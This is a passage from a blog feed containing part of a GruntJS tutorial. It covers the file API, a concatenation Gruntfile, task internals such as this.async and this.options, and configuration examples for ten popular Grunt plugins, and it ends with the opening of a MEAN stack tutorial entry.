<li><a href="http://gruntjs.com/api/grunt.file#grunt.file.mkdir" target="_blank" rel="noopener">grunt.file.mkdir(dirpath [, mode])</a>: creates directory and any intermediary. Like <code>mkdir -p</code>.</li>
<li><a href="http://gruntjs.com/api/grunt.file#grunt.file.expand" target="_blank" rel="noopener">grunt.file.expand([options, ] patterns)</a>: returns an array with all the files matching a pattern. It can also accept and array of patterns. Preceding a patter with <code>!</code> will negate them. E.g. <code>[&#39;**/*.js&#39;, !**/*spec.js]</code> =&gt; get all javascript (including subdirectories) but NOT the ones that ends with spec.js.</li>
<li><a href="http://gruntjs.com/api/grunt.file#grunt.file.recurse" target="_blank" rel="noopener">grunt.file.recurse(rootdir, callback)</a>: expand path and return a callback function with the following signature <code>callback(abspath, rootdir, subdir, filename)</code>.</li>
</ul>
<h1 id="Example-2-Gruntfile-for-files-manipulation">Example 2: Gruntfile for files manipulation<a href="#Example-2-Gruntfile-for-files-manipulation" class="headerlink" title="Example 2: Gruntfile for files manipulation"></a></h1><p>GruntJS comes with built-in functions for basic <a href="https://github.com/gruntjs/grunt/blob/master/lib/grunt/file.js" target="_blank" rel="noopener">file system handling</a>. To see the function in action. Create four directories: <code>stylesheets</code>, <code>javascripts</code>, <code>templates</code> and put files on first three. The idea is to concatenate all the files into one index.html and placed it a newly created <code>public</code> folder.</p>
<p>Here‚Äôs the grunt file that will copy and concatenate all the files for us:</p>
<figure class="highlight javascript"><figcaption><span>Gruntfile.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">grunt</span>)</span>&#123;</span><br><span class="line">  grunt.config.init(&#123;</span><br><span class="line">    concat: &#123;</span><br><span class="line">      options: &#123;</span><br><span class="line">        dest: <span class="string">'tmp'</span>,</span><br><span class="line">        templates: [<span class="string">'templates/header.html'</span>, <span class="string">'templates/footer.html'</span>],</span><br><span class="line">        javascripts: [<span class="string">'javascripts/*.js'</span>],</span><br><span class="line">        stylesheets: [<span class="string">'stylesheets'</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> recursiveConcat = <span class="function"><span class="keyword">function</span>(<span class="params">source, result</span>)</span>&#123;</span><br><span class="line">    grunt.file.expand(source).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">file</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(grunt.file.isDir(file))&#123;</span><br><span class="line">        grunt.file.recurse(file, <span class="function"><span class="keyword">function</span>(<span class="params">f</span>)</span>&#123;</span><br><span class="line">          result = recursiveConcat(f, result);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        grunt.log.writeln(<span class="string">'Concatenating '</span> + file + <span class="string">' to other '</span> + result.length + <span class="string">' characters.'</span>);</span><br><span class="line">        result += grunt.file.read(file);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  grunt.registerTask(<span class="string">'concat'</span>, <span class="string">'concatenates files'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">type</span>)</span>&#123;</span><br><span class="line">    grunt.config.requires(<span class="string">'concat.options.'</span> + type); <span class="comment">// fail the task if this propary is missing.</span></span><br><span class="line">    grunt.config.requires(<span class="string">'concat.options.dest'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> files = grunt.config.get(<span class="string">'concat.options.'</span> + type),</span><br><span class="line">      dest = grunt.config.get(<span class="string">'concat.options.dest'</span>),</span><br><span class="line">      concatenated = recursiveConcat(files, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    grunt.log.writeln(<span class="string">'Writing '</span> + concatenated.length + <span class="string">' chars to '</span> + <span class="string">'tmp/'</span> + type);</span><br><span class="line">    grunt.file.write(dest + <span class="string">'/'</span> + type, concatenated);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  grunt.registerTask(<span class="string">'concatAll'</span>, [<span class="string">'concat:templates'</span>, <span class="string">'concat:javascripts'</span>, <span class="string">'concat:stylesheets'</span>]);</span><br><span class="line">  grunt.registerTask(<span class="string">'default'</span>, [<span class="string">'concatAll'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>A more complete example can be found in the repository where we have the join and open function as well.</p>
<h2 id="Reference-3-Inside-Grunt-tasks">Reference 3: Inside Grunt tasks<a href="#Reference-3-Inside-Grunt-tasks" class="headerlink" title="Reference 3: Inside Grunt tasks"></a></h2><p>Inside all Grunt task there are number of functions available through <code>this</code>:</p>
<ul>
<li><a href="http://gruntjs.com/inside-tasks#this.async" target="_blank" rel="noopener">this.async</a>: designed for async tasks. Grunt will normally end the task without waiting for the callback to be executed. If you need Grunt to wait use <code>done()</code>.</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> done = <span class="keyword">this</span>.async();</span><br><span class="line"></span><br><span class="line">http.get(<span class="string">'http://adrianmejia.com'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">  res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ... process data ...</span></span><br><span class="line">    done(); <span class="comment">// forces Grunt to wait until data is received.</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;).on(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">  done(err); <span class="comment">// or an error is received.</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li><p><a href="http://gruntjs.com/inside-tasks#this.requires" target="_blank" rel="noopener">this.requires</a>: list of taskNames that should executed successfully first. E.g. <code>this.requires([&#39;concat&#39;, &#39;jshint&#39;])</code>.</p>
</li>
<li><p><a href="http://gruntjs.com/inside-tasks#this.name" target="_blank" rel="noopener">this.name</a>: this is the name of the task. E.g. <code>grunt hello</code>, then <code>this.name === &#39;name&#39;</code>.</p>
</li>
<li><p><a href="http://gruntjs.com/inside-tasks#this.args" target="_blank" rel="noopener">this.args</a>: returns an array with the parameters. E.g. <code>grunt hello:crazy:world</code>, then <code>this.args</code> will return <code>[&#39;crazy&#39;, &#39;world&#39;]</code>.</p>
</li>
<li><p><a href="http://gruntjs.com/inside-tasks#this.options" target="_blank" rel="noopener">this.options([defaultsObj])</a>: it gets options values from the <code>config.init</code>, optionally you can also pass an object containing the default values. Notice in the example below that even though console.log has a <code>this.options({gzip: true})</code> it gets override by the options parameters. If not one it is specified in the <code>config.init</code> then it will use the default gzip: true.</p>
</li>
</ul>
<p><strong>Inside MultiTasks</strong></p>
<p>Consider this <code>grunt.config.init</code> example:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">grunt</span>)</span>&#123;</span><br><span class="line">  grunt.config.init(&#123;</span><br><span class="line">    multiTaskName: &#123;</span><br><span class="line">      options: &#123;</span><br><span class="line">        gzip: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      target1: &#123;</span><br><span class="line">        src: <span class="string">'stylesheets/*.css'</span>,</span><br><span class="line">        dest: <span class="string">'public'</span>,</span><br><span class="line">        ext: <span class="string">'.min.css'</span></span><br><span class="line">      &#125;,</span><br><span class="line">      target2: &#123;</span><br><span class="line">        src: <span class="string">'*.js'</span>,</span><br><span class="line">        dest: <span class="string">'public'</span>,</span><br><span class="line">        ext: <span class="string">'.min.js'</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  grunt.registerMultiTask(<span class="string">'multiTaskName'</span>, <span class="string">'example'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'this.options'</span>, <span class="keyword">this</span>.options(&#123;<span class="attr">gzip</span>: <span class="literal">true</span>&#125;));</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'this.data'</span>, <span class="keyword">this</span>.data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'this.files'</span>, <span class="keyword">this</span>.files);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'this.filesSrc'</span>, <span class="keyword">this</span>.filesSrc);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><figcaption><span>Output example</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">grunt multiTaskName</span><br><span class="line"><span class="comment"># Running "multiTaskName:target1" (multiTaskName) task</span></span><br><span class="line"><span class="comment"># this.options &#123; gzip: false &#125;</span></span><br><span class="line"><span class="comment"># this.data &#123; src: 'stylesheets/*.css', dest: 'public', ext: '.min.css' &#125;</span></span><br><span class="line"><span class="comment"># this.files [ &#123; src: [Getter],</span></span><br><span class="line"><span class="comment">#     dest: 'public',</span></span><br><span class="line"><span class="comment">#     ext: '.min.css',</span></span><br><span class="line"><span class="comment">#     orig: &#123; src: [Object], dest: 'public', ext: '.min.css' &#125; &#125; ]</span></span><br><span class="line"><span class="comment"># this.filesSrc [ 'stylesheets/h1.css', 'stylesheets/h2.css' ]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Running "multiTaskName:target2" (multiTaskName) task</span></span><br><span class="line"><span class="comment"># this.options &#123; gzip: false &#125;</span></span><br><span class="line"><span class="comment"># this.data &#123; src: '*.js', dest: 'public', ext: '.min.js' &#125;</span></span><br><span class="line"><span class="comment"># this.files [ &#123; src: [Getter],</span></span><br><span class="line"><span class="comment">#     dest: 'public',</span></span><br><span class="line"><span class="comment">#     ext: '.min.js',</span></span><br><span class="line"><span class="comment">#     orig: &#123; src: [Object], dest: 'public', ext: '.min.js' &#125; &#125; ]</span></span><br><span class="line"><span class="comment"># this.filesSrc [ 'Gruntfile.js' ]</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><a href="http://gruntjs.com/inside-tasks#this.target" target="_blank" rel="noopener">this.target</a>: name of the target current target. If you call it <code>grunt multiTaskName</code>, it will run like multiple tasks calling each target one at a time. <code>this.target</code> will be equal to <code>target1</code> and then <code>target2</code>.</p>
</li>
<li><p><a href="http://gruntjs.com/inside-tasks#this.files" target="_blank" rel="noopener">this.files</a>: return a (single) array that has all the properties for the current target. Take a look the the output above.</p>
</li>
<li><p><a href="http://gruntjs.com/inside-tasks#this.filessrc" target="_blank" rel="noopener">this.filesSrc</a>: it expands files and paths against <code>src</code> and return an array with them.</p>
</li>
<li><p><a href="http://gruntjs.com/inside-tasks#this.data" target="_blank" rel="noopener">this.data</a>: contains the raw data of the target parameters.</p>
</li>
</ul>
<h1 id="Intermediate-Using-Grunt-js-plugins">Intermediate: Using Grunt.js plugins<a href="#Intermediate-Using-Grunt-js-plugins" class="headerlink" title="Intermediate: Using Grunt.js plugins"></a></h1><p>Chances are that there is a plugin for most of your needs. Last time I checked there were 3,638 plugins for grunt. This are the 10 most popular:</p>
<h2 id="Installing-a-grunt-plugin">Installing a grunt plugin<a href="#Installing-a-grunt-plugin" class="headerlink" title="Installing a grunt plugin"></a></h2><p>Let‚Äôs say we want to install jshint.</p>
<ol>
<li>Get the plugin module</li>
</ol>
<p>Download it from npm:</p>
<p><code>npm install grunt-contrib-jshint --save-dev</code></p>
<p>or from github:</p>
<p><code>npm install https://github.com/YOUR_USERNAME/grunt-contrib-YOUR-PLUGIN --save-dev</code></p>
<ol start="2">
<li>Load it in your Gruntfile</li>
</ol>
<p><code>grunt.loadNpmTasks(&#39;grunt-contrib-jshint&#39;);</code></p>
<p>or</p>
<p><code>grunt.loadNpmTasks(&#39;grunt-contrib-YOUR-PLUGIN&#39;);</code></p>
<h2 id="10-most-popular-grunt-plugins">10 most popular grunt plugins<a href="#10-most-popular-grunt-plugins" class="headerlink" title="10 most popular grunt plugins"></a></h2><p>1- <a href="https://github.com/gruntjs/grunt-contrib-jshint" target="_blank" rel="noopener">jshint</a>: Validate files with JSHint. Uses <code>.jshintrc</code> to settings.</p>
<figure class="highlight javascript"><figcaption><span>.jshintrc (example)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"curly"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">"eqnull"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">"eqeqeq"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">"undef"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">"globals"</span>: &#123;</span><br><span class="line">    <span class="string">"jQuery"</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2- <a href="https://github.com/gruntjs/grunt-contrib-watch" target="_blank" rel="noopener">watch</a>: Run predefined tasks whenever watched file patterns are added, changed or deleted. Spawn runs task in a child process but having set to <code>spawn: false</code> is faster.</p>
<figure class="highlight javascript"><figcaption><span>grunt.config.init (example)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">watch: &#123;</span><br><span class="line">  scripts: &#123;</span><br><span class="line">    files: [<span class="string">'**/*.js'</span>],</span><br><span class="line">    tasks: [<span class="string">'jshint'</span>],</span><br><span class="line">    options: &#123;</span><br><span class="line">      spawn: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p>3- <a href="https://github.com/gruntjs/grunt-contrib-uglify" target="_blank" rel="noopener">uglify</a>: minifies javascript files.
<figure class="highlight javascript"><figcaption><span>grunt.config.init (example)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uglify: &#123;</span><br><span class="line">  my_target: &#123;</span><br><span class="line">    files: &#123;</span><br><span class="line">      <span class="string">'dest/output.min.js'</span>: [<span class="string">'src/input1.js'</span>, <span class="string">'src/input2.js'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>4- <a href="https://github.com/gruntjs/grunt-contrib-clean" target="_blank" rel="noopener">clean</a>: Clean files and folders.
<figure class="highlight javascript"><figcaption><span>grunt.config.init (example)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">clean: &#123;</span><br><span class="line">  <span class="comment">// Deletes all .js files, but skips min.js files</span></span><br><span class="line">  js: [<span class="string">"path/to/dir/*.js"</span>, <span class="string">"!path/to/dir/*.min.js"</span>]</span><br><span class="line"></span><br><span class="line">  <span class="comment">// delete all files and directories here</span></span><br><span class="line">  build: [<span class="string">"path/to/dir/one"</span>, <span class="string">"path/to/dir/two"</span>],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>5- <a href="https://github.com/gruntjs/grunt-contrib-concat" target="_blank" rel="noopener">concat</a>: Concatenate files.
<figure class="highlight javascript"><figcaption><span>grunt.config.init (example simple)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">concat: &#123;</span><br><span class="line">  options: &#123;</span><br><span class="line">    separator: <span class="string">';'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  dist: &#123;</span><br><span class="line">    src: [<span class="string">'src/intro.js'</span>, <span class="string">'src/project.js'</span>, <span class="string">'src/outro.js'</span>],</span><br><span class="line">    dest: <span class="string">'dist/built.js'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><figcaption><span>grunt.config.init (adding banners and multiple targets)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pkg: grunt.file.readJSON(<span class="string">'package.json'</span>),</span><br><span class="line">concat: &#123;</span><br><span class="line">  options: &#123;</span><br><span class="line">    stripBanners: <span class="literal">true</span>,</span><br><span class="line">    banner: <span class="string">'/*! &lt;%= pkg.name %&gt; - v&lt;%= pkg.version %&gt; - '</span> +</span><br><span class="line">      <span class="string">'&lt;%= grunt.template.today("yyyy-mm-dd") %&gt; */'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  dist: &#123;</span><br><span class="line">    <span class="string">'dist/with_extras.js'</span>: [<span class="string">'src/main.js'</span>, <span class="string">'src/extras.js'</span>],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p>6- <a href="https://github.com/gruntjs/grunt-contrib-cssmin" target="_blank" rel="noopener">cssmin</a>: Compress CSS files.
<figure class="highlight javascript"><figcaption><span>grunt.config.init (example)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cssmin: &#123;</span><br><span class="line">  combine: &#123;</span><br><span class="line">    files: &#123;</span><br><span class="line">      <span class="string">'path/to/output.css'</span>: [<span class="string">'path/to/input_one.css'</span>, <span class="string">'path/to/input_two.css'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><figcaption><span>grunt.config.init (example with banner and adding .min.css extension)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cssmin: &#123;</span><br><span class="line">  add_banner: &#123;</span><br><span class="line">    options: &#123;</span><br><span class="line">      banner: <span class="string">'/* My minified css file */'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    files: [&#123;</span><br><span class="line">      expand: <span class="literal">true</span>,</span><br><span class="line">      cwd: <span class="string">'release/css/'</span>,</span><br><span class="line">      src: [<span class="string">'*.css'</span>, <span class="string">'!*.min.css'</span>],</span><br><span class="line">      dest: <span class="string">'release/css/'</span>,</span><br><span class="line">      ext: <span class="string">'.min.css'</span></span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>7- <a href="https://github.com/gruntjs/grunt-contrib-connect" target="_blank" rel="noopener">connect</a>: runs server as long as Grunt is running. It can be persistent passing <code>keepalive</code> like this <code>grunt connect:keepalive</code>.</p>
<figure class="highlight javascript"><figcaption><span>grunt.config.init (example)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">connect: &#123;</span><br><span class="line">  server: &#123;</span><br><span class="line">    options: &#123;</span><br><span class="line">      port: <span class="number">9001</span>,</span><br><span class="line">      base: <span class="string">'www-root'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>8- <a href="https://github.com/karma-runner/grunt-karma" target="_blank" rel="noopener">karma</a>: runs karma testing tool.</p>
<figure class="highlight javascript"><figcaption><span>grunt.config.init (example)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">karma: &#123;</span><br><span class="line">  unit: &#123;</span><br><span class="line">    options: &#123;</span><br><span class="line">      files: [<span class="string">'test/**/*.js'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><figcaption><span>grunt.config.init (example referencing karma.conf and overriding parameters)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">karma: &#123;</span><br><span class="line">  unit: &#123;</span><br><span class="line">    configFile: <span class="string">'karma.conf.js'</span>,</span><br><span class="line">    runnerPort: <span class="number">9999</span>,</span><br><span class="line">    singleRun: <span class="literal">true</span>,</span><br><span class="line">    browsers: [<span class="string">'PhantomJS'</span>],</span><br><span class="line">    logLevel: <span class="string">'ERROR'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>9- <a href="https://github.com/gruntjs/grunt-contrib-less" target="_blank" rel="noopener">less</a>: Compile LESS files to CSS.
<figure class="highlight javascript"><figcaption><span>grunt.config.init (example)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">less: &#123;</span><br><span class="line">  development: &#123;</span><br><span class="line">    options: &#123;</span><br><span class="line">      paths: [<span class="string">"assets/css"</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    files: &#123;</span><br><span class="line">      <span class="string">"path/to/result.css"</span>: <span class="string">"path/to/source.less"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  production: &#123;</span><br><span class="line">    options: &#123;</span><br><span class="line">      paths: [<span class="string">"assets/css"</span>],</span><br><span class="line">      cleancss: <span class="literal">true</span>,</span><br><span class="line">      modifyVars: &#123;</span><br><span class="line">        imgPath: <span class="string">'"http://mycdn.com/path/to/images"'</span>,</span><br><span class="line">        bgColor: <span class="string">'red'</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    files: &#123;</span><br><span class="line">      <span class="string">"path/to/result.css"</span>: <span class="string">"path/to/source.less"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>10- <a href="https://github.com/sindresorhus/grunt-concurrent" target="_blank" rel="noopener">concurrent</a>: Run grunt tasks concurrently.</p>
<figure class="highlight javascript"><figcaption><span>grunt.config.init (example)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">concurrent: &#123;</span><br><span class="line">  target1: [<span class="string">'coffee'</span>, <span class="string">'sass'</span>],</span><br><span class="line">  target2: [<span class="string">'jshint'</span>, <span class="string">'mocha'</span>],</span><br><span class="line">  target3: &#123;</span><br><span class="line">    tasks: [<span class="string">'nodemon'</span>, <span class="string">'watch'</span>],</span><br><span class="line">    options: &#123;</span><br><span class="line">      logConcurrentOutput: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In the next blog post, we will continue the tutorial with using GruntJS in a web application, making your own plugins and a comparison between other task runners tools such as Gulp, Gulp, Brunch, Rake::Pipeline and Broccoli.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sometimes you find yourself doing the same tasks again and again, especially during web development. It is time to automate repetitive tasks and use that time in more creative activities. This is where Grunt comes in. Grunt is a popular task runner that runs on NodeJS. It can minify CSS/JavaScript, run linting tools (JSHint, JSlint, CSSlint), deploy to server, and run test cases when you change a file to name a few. All the information I found about Grunt and similar Javascript test runners were too verbose and not very helpful to get started quickly. So, I decided to make this tutorial.&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Technologies/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="gruntjs" scheme="https://adrianmejia.com/tags/gruntjs/"/>
    
      <category term="nodejs" scheme="https://adrianmejia.com/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>MEAN Stack Tutorial MongoDB ExpressJS AngularJS NodeJS (Part III)</title>
    <link href="https://adrianmejia.com/blog/2014/10/03/mean-stack-tutorial-mongodb-expressjs-angularjs-nodejs/"/>
    <id>https://adrianmejia.com/blog/2014/10/03/mean-stack-tutorial-mongodb-expressjs-angularjs-nodejs/</id>
    <published>2014-10-03T10:59:34.000Z</published>
    <updated>2016-08-07T01:47:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>We are going to build a full stack Todo App using the MEAN (MongoDB, ExpressJS, AngularJS and NodeJS). This is the last part of <a href="/tags/Tutorial-MEAN-Stack/">three-post series tutorial</a>.</p>
<a id="more"></a>
<p>MEAN Stack tutorial series:</p>
<ol>
<li><a href="/blog/2014/09/28/angularjs-tutorial-for-beginners-with-nodejs-expressjs-and-mongodb/">AngularJS tutorial for beginners (Part I)</a></li>
<li><a href="/blog/2014/10/01/creating-a-restful-api-tutorial-with-nodejs-and-mongodb/">Creating RESTful APIs with NodeJS and MongoDB Tutorial (Part II)</a></li>
<li>MEAN Stack Tutorial: MongoDB, ExpressJS, AngularJS and NodeJS (Part III) <strong>üëà you are here</strong></li>
</ol>
<p>Before completing the app, let‚Äôs cover some background about the this stack. If you rather jump to the hands-on part click here to <a href="#start">get started</a>.</p>
